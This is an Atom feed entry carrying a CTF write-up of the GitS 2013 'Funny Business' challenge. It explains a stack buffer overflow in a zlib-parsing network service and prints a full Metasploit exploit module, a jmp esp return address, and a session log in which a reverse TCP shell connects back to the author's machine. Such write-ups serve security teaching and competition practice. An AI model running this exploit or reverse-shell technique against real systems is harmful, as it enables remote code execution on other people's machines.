<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: rop | CaptchaFlag CTF Team]]></title>
  <link href="http://www.captchaflag.com/blog/categories/rop/atom.xml" rel="self"/>
  <link href="http://www.captchaflag.com/"/>
  <updated>2014-10-28T17:44:42-04:00</updated>
  <id>http://www.captchaflag.com/</id>
  <author>
    <name><![CDATA[Captchaflag]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[GitS 2013 - Funny Business]]></title>
    <link href="http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business/"/>
    <updated>2013-02-17T13:53:00-05:00</updated>
    <id>http://www.captchaflag.com/blog/2013/02/17/gits-2013-funny-business</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>Points: 100</p>

<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1">File</a> running at funnybusiness.2013.ghostintheshellcode.com)</p>

<h2>Analysis</h2>

<p>In order to get the binary to run on 32-bit Linux, you first need to run:
<code>bash
$ adduser funnybusiness
$ sudo su
$ ./funnybiz.elf
</code></p>

<p>Application is running on port 49681:
<code>bash
stacks0n@ubuntu:~/Desktop$ netstat -antp | grep LISTEN | grep funnybiz
tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf   
</code></p>

<p>Let's look at HexRays decompilation of sub<em>8048C60:
```
int __cdecl sub</em>8048D70(int sock_fd)
{
  int v1; // ebx@1
  char v3; // [sp+1Fh] [bp-Dh]@4</p>

<p>*(<em>QWORD *)&amp;strm.zalloc = 0LL;
  strm.opaque = 0;
  *(</em>QWORD *)&amp;strm.next<em>in = 0LL;
  v1 = inflateInit</em>(&amp;strm, &quot;1.2.7&quot;, 56);
  if ( !v1 )
  {
    read<em>data</em>from<em>socket(sock</em>fd, &amp;strm.avail<em>in, 4);
    if ( strm.avail</em>in &lt;= 0x4000 )
    {
      read<em>data</em>from<em>socket(sock</em>fd, &amp;v3, strm.avail<em>in);
      strm.next</em>in = (Bytef *)&v3;
      strm.avail<em>out = 16384;
      strm.next</em>out = (Bytef *)&amp;unk_804B0A0;
      if ( inflate(&amp;strm, 4) != 1 )
        exit(0);
      inflateEnd(&amp;strm);
    }
  }
  return v1;
}
```</p>

<p>We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.</p>

<p>The second call to read<em>from</em>socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn't even a buffer allocated for the data. </p>

<p>The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don't have to worry about the appended data.</p>

<p>Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.</p>

<p><code>
stacks0n@stack0ns-MacBook-Pro:~&gt; ./msfelfscan funnybiz.elf -j esp
[/Users/stacks0n/funnybiz.elf]
0x08049043 jmp esp
</code></p>

<p>MSF module as follows:
```ruby</p>

<h1>This file is part of the Metasploit Framework and may be subject to</h1>

<h1>redistribution and commercial restrictions. Please see the Metasploit</h1>

<h1>web site for more information on licensing and terms of use.</h1>

<h1>http://metasploit.com/</h1>

<p>require 'msf/core'</p>

<p>class Metasploit3 &lt; Msf::Exploit::Remote
        Rank = GreatRanking</p>

<pre><code>    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
            super(update_info(info,
                    'Name'           =&gt; 'GitS 2013 Pwnable 100 - Funny Business',
                    'Author'         =&gt; 'stacks0n',
                    'License'        =&gt; MSF_LICENSE,
                    'Privileged'     =&gt; true,
                    'Platform'       =&gt; 'linux',
                    'DefaultTarget'  =&gt; 0))

            register_options(
                    [
                            Opt::RHOST('54.235.156.9'),
                            Opt::RPORT(49681)
                    ], self.class)

    end

    def exploit
            connect
            # we must send valid zlib data so the code doesn't exit
            # this is zlib deflation of a single 'a'
            zlib    = &quot;\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C&quot;
            padding = &quot;\x90\x90\x90&quot;
            rop     = &quot;\x43\x90\x04\x08&quot; # jmp esp
            p       = zlib + padding + rop + payload.encoded

            # send the size of our payload
            sock.put([p.size].pack(&quot;L&quot;))
            # send the payload
            sock.put(p)

            handler
            disconnect
    end
</code></pre>

<p>end
```</p>

<p>```bash
msf  exploit(funny_business) &gt; show options</p>

<p>Module options (exploit/gits/funny_business):</p>

<p>Name   Current Setting  Required  Description</p>

<hr>

<p>RHOST  54.235.156.9     yes       The target address
   RPORT  49681            yes       The target port</p>

<p>Payload options (linux/x86/shell<em>reverse</em>tcp):</p>

<p>Name   Current Setting  Required  Description</p>

<hr>

<p>LHOST  68.47.237.170     yes       The listen address
   LPORT  4444             yes       The listen port</p>

<p>Exploit target:</p>

<p>Id  Name</p>

<hr>

<p>0   Automatic</p>

<p>msf  exploit(funny_business) &gt; exploit </p>

<p>[-] Handler failed to bind to 68.47.237.170:4444
[<em>] Started reverse handler on 0.0.0.0:4444 
[</em>] Command shell session 1 opened (192.168.1.30:4444 -&gt; 54.235.156.9:57768) at 2013-02-15 23:54:39 -0500</p>

<p>cat key
Compressions can be hard at times
```</p>

<h2>Solution</h2>

<p>Compressions can be hard at times</p>
]]></content>
  </entry>
  
</feed>
